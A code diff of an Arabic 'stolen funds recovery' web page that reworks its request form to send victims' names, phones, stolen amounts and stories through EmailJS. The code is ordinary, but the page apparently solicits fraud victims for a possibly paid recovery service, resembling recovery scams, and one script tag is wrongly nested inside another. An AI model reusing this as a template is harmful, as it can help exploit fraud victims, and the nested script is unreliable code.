@@ -1174,61 +1174,79 @@
             </p>
     </div>
 </section>
-<section class="form-section" id="form">
+  <section class="form-section" id="form">
     <div class="form-container">
-        <div class="form-header">
-            <h3>نموذج استرجاع الأموال</h3>
-            <p>املأ البيانات التالية وسيتواصل معك فريقنا خلال 24 ساعة</p>
-        </div>
-        <form action="https://formsubmit.co/Onehotelonehotel@gmail.com" method="POST">
+      <div class="form-header">
+        <h3>نموذج استرجاع الأموال</h3>
+        <p>املأ البيانات التالية وسيتواصل معك فريقنا خلال 24 ساعة</p>
+      </div>
+      <form id="refundForm">
         <div class="form-content">
-            <div class="form-group">
-                <label for="name"><i class="fas fa-user"></i> الاسم بالكامل</label>
-                <input type="text" id="name" class="form-control" placeholder="أدخل اسمك الثلاثي">
+          <div class="form-group">
+            <label for="name"><i class="fas fa-user"></i> الاسم بالكامل</label>
+            <input type="text" id="name" class="form-control" placeholder="أدخل اسمك الثلاثي" required>
+          </div>
+          
+          <div class="form-group">
+            <label for="email"><i class="fas fa-envelope"></i> البريد الإلكتروني</label>
+            <input type="email" id="email" class="form-control" placeholder="example@domain.com" required>
+          </div>
+          
+          <div class="form-group">
+            <label for="phone"><i class="fas fa-phone"></i> رقم الهاتف</label>
+            <input type="tel" id="phone" class="form-control" placeholder="+974 XXXXXXXX" required>
+          </div>
+          
+          <div class="form-group">
+            <label for="amount"><i class="fas fa-money-bill-wave"></i> المبلغ المسروق (ريال قطري)</label>
+            <input type="number" id="amount" class="form-control" placeholder="أدخل المبلغ المسروق" required min="1">
+          </div>
+          
+          <div class="form-group">
+            <label for="story"><i class="fas fa-file-alt"></i> باختصار، كيف تم سرقة أموالك؟</label>
+            <textarea id="story" class="form-control" placeholder="صف لنا ما حدث معك بالتفصيل" required></textarea>
+          </div>
+          
+          <div class="warning-box">
+            <div class="warning-title">
+              <i class="fas fa-exclamation-triangle"></i>
+              تنويه هام
+            </div>
+            <div class="warning-content">
+              <ul>
+                <li>يرجى التأكد من دقة البيانات المُدخلة، حيث سيتم إسقاط الطلب تلقائيًا في حال عدم الرد على الهاتف</li>
+                <li>قد تكون الخدمة مدفوعة جزئيًا أو كليًا وفقًا لطبيعة الحالة وتعقيدها</li>
+                <li>جميع البيانات تُعامل بسرية تامة وتُستخدم فقط لأغراض المتابعة القانونية</li>
+              </ul>
+              <p>بالضغط على "أرسل الآن"، فإنك توافق على الشروط والأحكام المذكورة أعلاه</p>
+            </div>
+          </div>
+          
+          <button type="submit" class="submit-btn pulse" id="submitBtn">
+            <i class="fas fa-paper-plane"></i> أرسل الآن -- فريقنا سيتواصل معك فورًا
+          </button>
+          
+          <div class="messages">
+            <div class="message loading-message" id="loadingMessage">
+              <i class="fas fa-spinner fa-spin"></i>
+              <span>جاري إرسال بياناتك، يرجى الانتظار...</span>
             </div>
             
-            <div class="form-group">
-                <label for="email"><i class="fas fa-envelope"></i> البريد الإلكتروني</label>
-                <input type="email" id="email" class="form-control" placeholder="example@domain.com">
+            <div class="message success-message" id="successMessage">
+              <i class="fas fa-check-circle"></i>
+              <span>تم إرسال طلبك بنجاح! سيتواصل معك فريقنا خلال 24 ساعة.</span>
             </div>
             
-            <div class="form-group">
-                <label for="phone"><i class="fas fa-phone"></i> رقم الهاتف</label>
-                <input type="tel" id="phone" class="form-control" placeholder="+974 XXXXXXXX">
+            <div class="message error-message" id="errorMessage">
+              <i class="fas fa-exclamation-circle"></i>
+              <span id="errorText">حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.</span>
             </div>
-            
-            <div class="form-group">
-                <label for="amount"><i class="fas fa-money-bill-wave"></i> المبلغ المسروق (ريال قطري)</label>
-                <input type="number" id="amount" class="form-control" placeholder="أدخل المبلغ المسروق">
-            </div>
-            
-            <div class="form-group">
-                <label for="story"><i class="fas fa-file-alt"></i> باختصار، كيف تم سرقة أموالك؟</label>
-                <textarea id="story" class="form-control" placeholder="صف لنا ما حدث معك بالتفصيل"></textarea>
-            </div>
-            
-            <div class="warning-box">
-                <div class="warning-title">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    تنويه هام
-                </div>
-                <div class="warning-content">
-                    <ul>
-                        <li>يرجى التأكد من دقة البيانات المُدخلة، حيث سيتم إسقاط الطلب تلقائيًا في حال عدم الرد على الهاتف</li>
-                        <li>قد تكون الخدمة مدفوعة جزئيًا أو كليًا وفقًا لطبيعة الحالة وتعقيدها</li>
-                        <li>جميع البيانات تُعامل بسرية تامة وتُستخدم فقط لأغراض المتابعة القانونية</li>
-                    </ul>
-                    <p>بالضغط على "أرسل الآن"، فإنك توافق على الشروط والأحكام المذكورة أعلاه</p>
-                </div>
-            </div>
-            
-            <button class="submit-btn" id="submitBtn">
-                <i class="fas fa-paper-plane"></i> أرسل الآن -- فريقنا سيتواصل معك فورًا
-            </button>
-        </form>
+          </div>
         </div>
+      </form>
     </div>
-</section>
+  </section>
+
    <section class="services" id="services">
         <div class="container">
             <h2 class="section-title">خدماتنا المتخصصة</h2>
@@ -1532,6 +1550,113 @@
         </div>
     </footer>
 <script>
+      <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    // تهيئة EmailJS
+    emailjs.init("EKgLVbV3oThOAa4lD");
+    
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.getElementById('refundForm');
+      const loadingMessage = document.getElementById('loadingMessage');
+      const successMessage = document.getElementById('successMessage');
+      const errorMessage = document.getElementById('errorMessage');
+      const errorText = document.getElementById('errorText');
+      
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // إخفاء جميع الرسائل
+        hideAllMessages();
+        
+        // التحقق من صحة النموذج
+        if (!validateForm()) {
+          return;
+        }
+        
+        // إظهار رسالة التحميل
+        loadingMessage.style.display = 'flex';
+        
+        // جمع بيانات النموذج
+        const formData = {
+          name: document.getElementById('name').value,
+          email: document.getElementById('email').value,
+          phone: document.getElementById('phone').value,
+          amount: document.getElementById('amount').value,
+          story: document.getElementById('story').value
+        };
+        
+        // إرسال البيانات عبر EmailJS
+        emailjs.send("service_k1mpndl", "template_9it1w6t", {
+          to_name: "فريق استرجاع الأموال",
+          from_name: formData.name,
+          from_email: formData.email,
+          subject: `طلب استرجاع أموال بقيمة ${formData.amount} ريال قطري`,
+          message: `
+            الاسم: ${formData.name}
+            البريد الإلكتروني: ${formData.email}
+            رقم الهاتف: ${formData.phone}
+            المبلغ المسروق: ${formData.amount} ريال قطري
+            التفاصيل: ${formData.story}
+          `
+        })
+        .then(function(response) {
+          // إخفاء رسالة التحميل وإظهار رسالة النجاح
+          loadingMessage.style.display = 'none';
+          successMessage.style.display = 'flex';
+          
+          // إعادة تعيين النموذج بعد 3 ثوان
+          setTimeout(function() {
+            form.reset();
+            successMessage.style.display = 'none';
+          }, 5000);
+        }, function(error) {
+          // إخفاء رسالة التحميل وإظهار رسالة الخطأ
+          loadingMessage.style.display = 'none';
+          errorText.textContent = `حدث خطأ: ${error.text || 'يرجى المحاولة مرة أخرى'}`;
+          errorMessage.style.display = 'flex';
+        });
+      });
+      
+      // دالة للتحقق من صحة النموذج
+      function validateForm() {
+        const email = document.getElementById('email').value;
+        const phone = document.getElementById('phone').value;
+        const amount = document.getElementById('amount').value;
+        
+        // التحقق من صحة البريد الإلكتروني
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailRegex.test(email)) {
+          errorText.textContent = 'البريد الإلكتروني غير صالح. يرجى إدخال بريد صحيح.';
+          errorMessage.style.display = 'flex';
+          return false;
+        }
+        
+        // التحقق من رقم الهاتف (يجب أن يحتوي على الأقل على 8 أرقام)
+        const phoneRegex = /[0-9]{8,}/;
+        if (!phoneRegex.test(phone)) {
+          errorText.textContent = 'رقم الهاتف غير صالح. يرجى إدخال رقم هاتف صحيح.';
+          errorMessage.style.display = 'flex';
+          return false;
+        }
+        
+        // التحقق من المبلغ (يجب أن يكون أكبر من الصفر)
+        if (parseInt(amount) <= 0) {
+          errorText.textContent = 'المبلغ يجب أن يكون أكبر من الصفر.';
+          errorMessage.style.display = 'flex';
+          return false;
+        }
+        
+        return true;
+      }
+      
+      // دالة لإخفاء جميع الرسائل
+      function hideAllMessages() {
+        loadingMessage.style.display = 'none';
+        successMessage.style.display = 'none';
+        errorMessage.style.display = 'none';
+      }
+    });
+  </script>
     // وظيفة للتشغيل ووضع الفيديو في وضع ملء الشاشة
     document.getElementById('playButton').addEventListener('click', function() {
         const videoContainer = document.getElementById('videoContainer');
